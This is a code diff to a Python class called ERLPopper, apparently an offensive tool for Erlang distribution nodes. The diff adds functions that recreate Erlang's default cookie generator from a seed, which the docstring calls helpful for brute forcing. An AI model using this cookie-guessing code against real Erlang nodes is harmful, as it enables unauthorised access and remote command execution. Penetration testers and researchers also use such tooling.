@@ -25,7 +25,7 @@ class ERLPopper:
         def __init__(self, message):
             self.message = message
 
-    def __init__(self, target, cookie, version=6, challenge=None, cmd=None, verbose=False):
+    def __init__(self, target, cookie, version=5, challenge=None, cmd=None, verbose=False):
         (host, port) = target.split(':')
         self.remote_host = host
         self.remote_port = int(port)
@@ -506,3 +506,27 @@ class ERLPopper:
         res = self._recv_cmd_resp()
 
         return res
+    
+    # Adapted from erl-matter/erldp.c
+    @staticmethod
+    def _next_random(x):
+        ret = (x * 17059465 + 1) & 0xfffffffff
+        return ret
+
+    @staticmethod
+    # Adapted from erl-matter/erldp.c
+    def _create_cookie(seed, size=20):
+        x = seed
+        cookie = []
+        for i in range(size-1, -1, -1):
+            x = ERLPopper._next_random(x)
+            cookie.insert(0, chr(ord('A') + int((26*x) / 0x1000000000)))
+        return ''.join(cookie)
+
+    @staticmethod
+    def create_cookie_from_seed(seed, size=20):
+        '''
+        Attempts to reproduce the erlang default cookie generation method. Helpful for 
+        brute forcing.
+        '''
+        return ERLPopper._create_cookie(seed, size)
